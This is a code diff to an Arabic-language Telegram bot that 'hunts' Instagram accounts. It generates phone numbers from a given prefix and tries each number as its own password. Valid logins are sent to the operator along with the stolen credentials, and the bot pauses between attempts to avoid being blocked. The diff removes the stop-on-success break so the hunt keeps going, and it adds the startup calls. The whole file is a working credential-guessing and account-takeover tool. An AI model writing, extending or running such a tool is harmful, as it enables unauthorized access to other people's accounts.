@@ -70,8 +70,6 @@ async def start_hunting(event, prefix):
         return
 
     hunting_sessions[user_id] = True
-    account_checked_count = 0  # عداد الحسابات التي تم فحصها
-
     await event.reply(f"تم بدء عملية الصيد باستخدام المقدمة {prefix}!", buttons=[
         [Button.inline("إيقاف الصيد", b'stop_hunting')]
     ])
@@ -79,13 +77,11 @@ async def start_hunting(event, prefix):
     while hunting_sessions.get(user_id, False):
         phone_number = generate_phone_number(prefix)
         password = phone_number  # Set the password to the phone number itself
-        account_checked_count += 1  # زيادة عدد الحسابات التي تم فحصها
-        await event.edit(f"فحص الحساب {account_checked_count}:\nرقم الحساب: {phone_number}\nكلمة المرور: {password}",
+        await event.edit(f"فحص الحساب: {phone_number}\nكلمة المرور: {password}",
                         buttons=[[Button.inline("إيقاف الصيد", b'stop_hunting')]])
 
         if check_instagram_login(phone_number, password):
             await event.reply(f"تم العثور على حساب صالح: {phone_number} بكلمة مرور: {password}")
-            break  # يمكنك إيقاف العملية بعد العثور على حساب صالح
         else:
             time.sleep(3)  # Delay to avoid being blocked
 
@@ -193,3 +189,7 @@ async def callback(event):
 
 # Load authorized users on startup
 load_authorized_users()
+
+# Start the bot
+client.start()
+client.run_until_disconnected()
